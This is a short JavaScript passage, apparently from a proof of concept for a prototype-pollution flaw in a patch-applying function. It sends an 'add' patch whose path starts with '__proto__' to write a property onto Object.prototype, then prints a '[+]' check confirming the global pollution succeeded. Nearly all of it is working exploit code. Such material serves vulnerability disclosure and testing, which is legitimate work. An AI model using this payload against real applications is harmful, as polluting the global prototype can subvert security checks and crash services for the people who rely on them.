   // When a patch operation targets a key immediately following "__proto__", it writes directly
   // onto the global prototype object, affecting all objects in the runtime environment.
   applyPatches({}, [
     { op: 'add', path: ['__proto__', 'exploited'], value: true }
   ]);

   console.log('[+] Post-condition verification: "exploited" in Object.prototype =>', 'exploited' in Object.prototype);
